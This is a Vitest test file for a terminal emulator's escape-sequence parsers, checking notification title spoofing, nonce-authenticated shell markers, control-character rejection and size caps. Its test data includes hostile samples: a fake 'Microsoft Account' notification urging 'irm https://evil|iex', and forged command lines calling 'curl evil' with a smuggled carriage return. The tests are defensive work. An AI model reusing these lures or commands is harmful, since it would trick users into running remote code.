import { describe, it, expect } from "vitest";
import {
  parseExitCode,
  parseOsc9,
  parseOsc777,
  parseCommandLine,
  isAuthedPromptStart,
  parseNoncedPayload,
  planResize,
  isAltScreenModeParams,
  capNotifyText,
  NOTIFY_MAX,
  TERMINAL_NOTIFY_TITLE,
  buildOsc9Notification,
  buildOsc777Notification,
  selectCmdStart,
  planCap,
} from "./osc";

describe("parseExitCode (#41: no false success/failure)", () => {
  it('empty rest (D missing / Ctrl-C) => -1 (unknown/aborted, NOT success)', () => {
    expect(parseExitCode("")).toBe(-1);
  });

  it('"0" => 0 (CRITICAL: real success MUST stay 0, not -1)', () => {
    expect(parseExitCode("0")).toBe(0);
  });

  it('"1" => 1 (failure preserved)', () => {
    expect(parseExitCode("1")).toBe(1);
  });

  it('"137" => 137 (SIGKILL-style exit preserved)', () => {
    expect(parseExitCode("137")).toBe(137);
  });

  it('"garbage" => -1 (non-numeric payload is unknown, NOT success)', () => {
    expect(parseExitCode("garbage")).toBe(-1);
  });

  it('"0;extra" => 0 (success with trailing params stays 0)', () => {
    expect(parseExitCode("0;extra")).toBe(0);
  });

  it('";x" (leading semicolon) => -1 (empty code field is unknown)', () => {
    expect(parseExitCode(";x")).toBe(-1);
  });
});

describe("parseOsc9 (#32: iTerm2-style OSC 9 notification)", () => {
  it("plain message => body", () => {
    expect(parseOsc9("Build finished")).toBe("Build finished");
  });

  it("trims surrounding whitespace", () => {
    expect(parseOsc9("  done  ")).toBe("done");
  });

  it("empty => null (nothing to notify)", () => {
    expect(parseOsc9("")).toBeNull();
  });

  it("ConEmu progress (4;...) => null (not a notification)", () => {
    expect(parseOsc9("4;50")).toBeNull();
  });

  it("ConEmu numeric subcommand (1;C:\\path) => null", () => {
    expect(parseOsc9("1;C:\\path")).toBeNull();
  });

  it("message that merely contains a digit is kept", () => {
    expect(parseOsc9("Test 3 passed")).toBe("Test 3 passed");
  });
});

describe("parseOsc777 (#32: OSC 777;notify;title;body)", () => {
  it("full notify => title + body", () => {
    expect(parseOsc777("notify;Claude;Task complete")).toEqual({
      title: "Claude",
      body: "Task complete",
    });
  });

  it("missing body => empty body, title kept", () => {
    expect(parseOsc777("notify;Claude")).toEqual({ title: "Claude", body: "" });
  });

  it("missing title => 'orb' fallback", () => {
    expect(parseOsc777("notify;;just a body")).toEqual({ title: "orb", body: "just a body" });
  });

  it("body containing semicolons is preserved", () => {
    expect(parseOsc777("notify;T;a;b;c")).toEqual({ title: "T", body: "a;b;c" });
  });

  it("non-notify subcommand => null (ignored)", () => {
    expect(parseOsc777("something;else")).toBeNull();
  });

  it("notify with no title and no body => null (no info)", () => {
    expect(parseOsc777("notify;;")).toBeNull();
    expect(parseOsc777("notify")).toBeNull();
  });

  it("#73 SEC-7: 巨大 title/body は NOTIFY_MAX で省略記号付きに切り詰め", () => {
    const hugeTitle = "T".repeat(1000);
    const hugeBody = "B".repeat(1000);
    const n = parseOsc777(`notify;${hugeTitle};${hugeBody}`);
    expect(n?.title.length).toBe(NOTIFY_MAX + 1); // +1 は末尾の "…"
    expect(n?.title.endsWith("…")).toBe(true);
    expect(n?.body.length).toBe(NOTIFY_MAX + 1);
    expect(n?.body.endsWith("…")).toBe(true);
  });
});

describe("capNotifyText (#73 SEC-7: 通知本文の DoS 対策)", () => {
  it("NOTIFY_MAX 以下はそのまま", () => {
    expect(capNotifyText("short")).toBe("short");
  });

  it("ちょうど NOTIFY_MAX 文字はそのまま（境界値）", () => {
    const exact = "x".repeat(NOTIFY_MAX);
    expect(capNotifyText(exact)).toBe(exact);
  });

  it("NOTIFY_MAX を1文字でも超えると切り詰めて末尾に … を付与", () => {
    const over = "x".repeat(NOTIFY_MAX + 1);
    const capped = capNotifyText(over);
    expect(capped.length).toBe(NOTIFY_MAX + 1);
    expect(capped).toBe("x".repeat(NOTIFY_MAX) + "…");
  });
});

describe("parseOsc9 (#73 SEC-7: 巨大 payload の cap)", () => {
  it("NOTIFY_MAX 超の message は切り詰められる", () => {
    const body = parseOsc9("A".repeat(500));
    expect(body?.length).toBe(NOTIFY_MAX + 1);
    expect(body?.endsWith("…")).toBe(true);
  });
});

describe("buildOsc9Notification (#73 SEC-4: title は常に固定ラベル)", () => {
  it("body があれば固定タイトル + そのまま body", () => {
    expect(buildOsc9Notification("Build finished")).toEqual({
      title: TERMINAL_NOTIFY_TITLE,
      body: "Build finished",
    });
  });

  it("null になる入力（空/ConEmu数値サブコマンド）はそのまま null", () => {
    expect(buildOsc9Notification("")).toBeNull();
    expect(buildOsc9Notification("4;50")).toBeNull();
  });
});

describe("buildOsc777Notification (#73 SEC-4: OSC 777 title なりすまし対策)", () => {
  it("攻撃者が偽装した title（例: なりすまし文言）は捨てられ、常に固定ラベルになる", () => {
    const spoofed = buildOsc777Notification(
      "notify;Microsoft Account;Session expired — run: irm https://evil|iex",
    );
    expect(spoofed).toEqual({
      title: TERMINAL_NOTIFY_TITLE,
      body: "Session expired — run: irm https://evil|iex",
    });
    expect(spoofed?.title).not.toContain("Microsoft");
  });

  it("title 省略時のフォールバック（'orb'）も同じく固定ラベルに上書きされる", () => {
    expect(buildOsc777Notification("notify;;just a body")).toEqual({
      title: TERMINAL_NOTIFY_TITLE,
      body: "just a body",
    });
  });

  it("null になる入力（notify 以外のサブコマンド等）はそのまま null", () => {
    expect(buildOsc777Notification("something;else")).toBeNull();
    expect(buildOsc777Notification("notify;;")).toBeNull();
  });

  it("body も NOTIFY_MAX で切り詰められる（title すり替えの後段でも DoS 対策は効く）", () => {
    const n = buildOsc777Notification(`notify;x;${"B".repeat(1000)}`);
    expect(n?.title).toBe(TERMINAL_NOTIFY_TITLE);
    expect(n?.body.length).toBe(NOTIFY_MAX + 1);
    expect(n?.body.endsWith("…")).toBe(true);
  });
});

describe("parseCommandLine (#33: OSC 633;E nonce 検証)", () => {
  const N = "abc123def456";

  it("nonce 一致 → コマンドラインを返す", () => {
    expect(parseCommandLine(`${N};echo hi`, N)).toBe("echo hi");
  });

  it("nonce 不一致 → null（出力に紛れた偽 E / エコー破片を捨てる）", () => {
    expect(parseCommandLine(`forged;curl evil.example`, N)).toBeNull();
  });

  it("expectedNonce 空 → 常に null（未配線シェルは安全側で受け付けない）", () => {
    expect(parseCommandLine(`${N};echo hi`, "")).toBeNull();
  });

  it("区切り ; 無し → null（壊れた payload）", () => {
    expect(parseCommandLine(N, N)).toBeNull();
  });

  it("__orb_escape の \\x3b（;）を復元する", () => {
    expect(parseCommandLine(`${N};echo a\\x3b echo b`, N)).toBe("echo a; echo b");
  });

  it("空コマンド → null", () => {
    expect(parseCommandLine(`${N};`, N)).toBeNull();
  });

  it("CR(\\x0d) 入り → null（再実行の即時実行化を防ぐ・正規行に CR は現れない）", () => {
    expect(parseCommandLine(`${N};git status\\x0dcurl evil`, N)).toBeNull();
  });

  it("その他の制御文字（\\x03 / \\x1b / \\x04）入り → null", () => {
    expect(parseCommandLine(`${N};a\\x03b`, N)).toBeNull();
    expect(parseCommandLine(`${N};a\\x1b[Ab`, N)).toBeNull();
    expect(parseCommandLine(`${N};a\\x04`, N)).toBeNull();
  });

  it("改行(\\x0a)とタブ(\\x09)は正規の複数行/タブ入り貼り付けとして許容", () => {
    expect(parseCommandLine(`${N};line1\\x0aline2`, N)).toBe("line1\nline2");
    expect(parseCommandLine(`${N};a\\x09b`, N)).toBe("a\tb");
  });

  it("上限（COMMAND_MAX）超過 → null", () => {
    expect(parseCommandLine(`${N};${"x".repeat(5000)}`, N)).toBeNull();
  });
});

describe("isAuthedPromptStart (#71: A マーカーの nonce 認証・偽ブロック偽造防止)", () => {
  const N = "abc123def456";

  it("nonce 一致（633;A;<nonce>）→ true（正規のプロンプト開始を処理する）", () => {
    expect(isAuthedPromptStart(N, N)).toBe(true);
  });

  it("nonce 無し（旧 633;A 相当・rest 空）→ false（敵対的出力の中断クローズ偽造を弾く）", () => {
    expect(isAuthedPromptStart("", N)).toBe(false);
  });

  it("nonce 不一致 → false（出力に紛れた偽 A を弾く）", () => {
    expect(isAuthedPromptStart("forged", N)).toBe(false);
  });

  it("expectedNonce 空（未配線）→ 常に false（安全側・空 rest でも通さない）", () => {
    expect(isAuthedPromptStart("", "")).toBe(false);
    expect(isAuthedPromptStart(N, "")).toBe(false);
  });
});

describe("parseNoncedPayload (#71: D/P マーカーの nonce 認証・偽 exit/偽 cwd 防止)", () => {
  const N = "abc123def456";

  it("D: nonce 一致（633;D;<nonce>;<code>）→ 終了コード文字列を返す", () => {
    expect(parseNoncedPayload(`${N};0`, N)).toBe("0");
    expect(parseNoncedPayload(`${N};137`, N)).toBe("137");
  });

  it("P: nonce 一致（633;P;<nonce>;Cwd=…）→ プロパティ部を返す", () => {
    expect(parseNoncedPayload(`${N};Cwd=C:\\proj`, N)).toBe("Cwd=C:\\proj");
    expect(parseNoncedPayload(`${N};PromptType=starship`, N)).toBe("PromptType=starship");
  });

  it("D: nonce 無し（旧 633;D;0 相当）→ null（偽の成功✓＝偽 exit code を弾く）", () => {
    expect(parseNoncedPayload("0", N)).toBeNull();
  });

  it("P: nonce 無し（旧 633;P;Cwd=… 相当）→ null（cwd 偽装を弾く）", () => {
    expect(parseNoncedPayload("Cwd=/evil", N)).toBeNull();
  });

  it("nonce 不一致 → null（出力に紛れた偽 D/P を弾く）", () => {
    expect(parseNoncedPayload("forged;0", N)).toBeNull();
    expect(parseNoncedPayload("forged;Cwd=/evil", N)).toBeNull();
  });

  it("expectedNonce 空（未配線）→ 常に null（安全側）", () => {
    expect(parseNoncedPayload(`${N};0`, "")).toBeNull();
  });

  it("区切り ; 無し（nonce だけ）→ null（壊れた payload）", () => {
    expect(parseNoncedPayload(N, N)).toBeNull();
  });

  it("最初の ; だけで割る（nonce 部が一致すれば payload 内の ; は保持）", () => {
    expect(parseNoncedPayload(`${N};Cwd=a;b`, N)).toBe("Cwd=a;b");
  });
});

describe("planResize (#56: resize 時のブロック装飾レジストリ整理)", () => {
  const entry = (id: string, width: number, line = 10, isDisposed = false) => ({
    id,
    width,
    marker: { line, isDisposed },
  });
  const ids = (arr: Array<{ id: string }>) => arr.map((e) => e.id);

  it("幅が cols と違う生存エントリだけ stale（作り直し対象）", () => {
    const a = entry("a", 120);
    const b = entry("b", 80);
    const { keep, drop, stale } = planResize([a, b], 80);
    expect(ids(keep)).toEqual(["a", "b"]);
    expect(drop).toEqual([]);
    expect(ids(stale)).toEqual(["a"]);
  });

  it("全エントリの幅が cols 一致 → stale 空（cols 不変 resize は no-op）", () => {
    const { keep, drop, stale } = planResize([entry("a", 80), entry("b", 80)], 80);
    expect(keep.length).toBe(2);
    expect(drop).toEqual([]);
    expect(stale).toEqual([]);
  });

  it("dispose 済み marker は drop（掃除）で stale に入らない", () => {
    const dead = entry("dead", 120, 10, true);
    const alive = entry("alive", 120);
    const { keep, drop, stale } = planResize([dead, alive], 80);
    expect(ids(keep)).toEqual(["alive"]);
    expect(ids(drop)).toEqual(["dead"]);
    expect(ids(stale)).toEqual(["alive"]);
  });

  it("line < 0（スクロールバックから溢れた marker）も drop", () => {
    const fell = entry("fell", 80, -1);
    const { keep, drop, stale } = planResize([fell], 80);
    expect(keep).toEqual([]);
    expect(ids(drop)).toEqual(["fell"]);
    expect(stale).toEqual([]);
  });

  it("混在幅も全部 stale になる（alt-screen 中スキップで一部だけ古い幅 → 自己修復）", () => {
    const { stale } = planResize([entry("a", 120), entry("b", 100), entry("c", 80)], 90);
    expect(ids(stale)).toEqual(["a", "b", "c"]);
  });

  it("空レジストリ → 全部空", () => {
    expect(planResize([], 80)).toEqual({ keep: [], drop: [], stale: [] });
  });
});

describe("selectCmdStart (#Theme-D1: 所要時間の起点は C(出力開始) を優先・A へフォールバック)", () => {
  it("C 時刻(outputStart>0)があればそれを使う（A→C のアイドルを除外）", () => {
    // A=1000（プロンプト表示）→ 10分放置 → C=601000（コマンド出力開始）。起点は C。
    expect(selectCmdStart(1000, 601000)).toBe(601000);
  });

  it("C 未受信(0)なら A 時刻へフォールバック（コマンド無しの素プロンプト等）", () => {
    expect(selectCmdStart(1000, 0)).toBe(1000);
  });

  it("両方 0（未開始）なら 0（logBlock/notify の未開始ガードが効く）", () => {
    expect(selectCmdStart(0, 0)).toBe(0);
  });
});

describe("planCap (#Theme-D3: レジストリを直近 max 件に制限し溢れた古い要素を evict)", () => {
  it("max 以下は evict 空・keep は同一参照（no-op）", () => {
    const list = [1, 2, 3];
    const { keep, evict } = planCap(list, 5);
    expect(keep).toBe(list);
    expect(evict).toEqual([]);
  });

  it("ちょうど max は no-op（境界値）", () => {
    const { evict } = planCap([1, 2, 3], 3);
    expect(evict).toEqual([]);
  });

  it("超過分は古い方（先頭）から evict、keep は直近 max 件", () => {
    const { keep, evict } = planCap([1, 2, 3, 4, 5], 3);
    expect(evict).toEqual([1, 2]); // 古い方から dispose 対象
    expect(keep).toEqual([3, 4, 5]); // 直近 max 件を残す
  });

  it("1件ずつ追加相当（max+1）は先頭1件だけ evict", () => {
    const { keep, evict } = planCap([10, 20, 30, 40], 3);
    expect(evict).toEqual([10]);
    expect(keep).toEqual([20, 30, 40]);
  });
});

describe("isAltScreenModeParams (alt-screen 検知: xterm キャッシュ非依存の生 CSI 判定)", () => {
  it("1049（alt screen buffer cursor）を含む => true", () => {
    expect(isAltScreenModeParams([1049])).toBe(true);
  });

  it("47（alt screen buffer）を含む => true", () => {
    expect(isAltScreenModeParams([47])).toBe(true);
  });

  it("1047（alt screen buffer）を含む => true", () => {
    expect(isAltScreenModeParams([1047])).toBe(true);
  });

  it("複数 param のうちどれかが対象コードなら true（1個の CSI に複数モードがまとまる実例）", () => {
    expect(isAltScreenModeParams([2004, 1049])).toBe(true);
  });

  it("無関係なモード（bracketed paste 2004 のみ等）=> false", () => {
    expect(isAltScreenModeParams([2004])).toBe(false);
    expect(isAltScreenModeParams([25])).toBe(false);
  });

  it("空 params => false", () => {
    expect(isAltScreenModeParams([])).toBe(false);
  });

  it("サブパラメータ（number[] 要素）は対象コードと解釈しない", () => {
    expect(isAltScreenModeParams([[1049, 2]])).toBe(false);
  });
});
